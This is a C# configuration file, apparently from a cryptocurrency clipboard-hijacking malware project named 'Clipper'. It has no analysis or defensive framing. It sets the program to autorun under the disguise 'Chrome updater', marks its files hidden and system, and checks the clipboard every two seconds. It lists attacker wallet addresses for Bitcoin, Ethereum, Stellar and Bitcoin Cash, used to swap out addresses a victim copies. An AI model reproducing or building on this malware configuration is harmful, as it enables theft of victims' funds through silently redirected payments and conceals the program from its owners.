using System.Collections.Generic;

namespace Clipper
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace 
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" }, // Bitcoin
            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" }, // Ethereum
            {"xmr", "" }, // Monero
            {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
            {"xrp", "" }, // Ripple
            {"ltc", "" }, // Litecoin
            {"nec", "" }, // Neocoin
            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
            {"dash", "" } // Dashcoin
        };
        // Mutex (random)
        public static string mutex = "a1sfrewrfwerewsf231";

    }
}
